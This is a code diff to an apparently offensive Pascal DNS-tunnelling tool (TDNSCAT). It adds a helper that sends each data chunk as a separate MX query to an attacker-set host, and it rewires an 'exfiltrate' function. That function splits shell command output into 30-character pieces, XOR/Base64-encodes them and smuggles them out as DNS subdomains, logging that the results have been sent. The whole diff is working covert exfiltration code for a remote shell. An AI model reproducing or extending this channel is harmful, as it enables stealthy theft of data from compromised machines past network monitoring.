@@ -112,6 +112,24 @@ begin
   );
 end;
 {$IFEND}
+
+function traffic_Seg(const data:string):string;   // send every chunk with separated request
+var
+  tmp_list : Tstringlist;
+  DNSd: TDNSsend;
+begin
+  DNSd := TDNSSend.Create;
+  tmp_list := Tstringlist.create;
+  try
+  DNSd.TargetHost := i_host;
+  DNSd.DNSQuery(data+'.'+i_host, QTYPE_MX, tmp_list);
+
+  finally
+    DNSd.Free;
+  end;
+
+end;
+
 procedure TDNSCAT.TXTvalueQuery;
 var
   l:tstringlist;
@@ -212,16 +230,10 @@ End;
 
 function exfiltrate(str:string):string;
 var
-  l:tstringlist;
-  DNSd: TDNSSend;
   NumElem, i ,Len:Integer;
   Arr: array of String;
 begin
-
-     DNSd := TDNSSend.Create;
-      l := Tstringlist.Create;
      Len := Length(str);
-
     // Calculate how many full elements we need
     NumElem := Len div 30;
     // Handle the leftover content at the end
@@ -235,16 +247,14 @@ begin
     for i := 0 to High(Arr) do
       Arr[i] := Copy(Str, i * 30 + 1, 30);
 
-
    // Send data into DNS server as Chunks
    for i := 0 to High(Arr) do begin
 
-  DNSd.TargetHost := i_host;
-  DNSd.DNSQuery(TestXorBase64(Arr[i])+'.'+i_host, QType_MX, l);
+  //DNSd.TargetHost := i_host;
+  traffic_Seg(TestXorBase64(Arr[i]));
+  //DNSd.DNSQuery(TestXorBase64(Arr[i])+'.'+i_host, QType_MX, l);
   writeln('[+]Shell command results has been sent -> ');
 end;
-
-   //it is not urgent to free dns component or stringlist in our code case
 
 end;
 
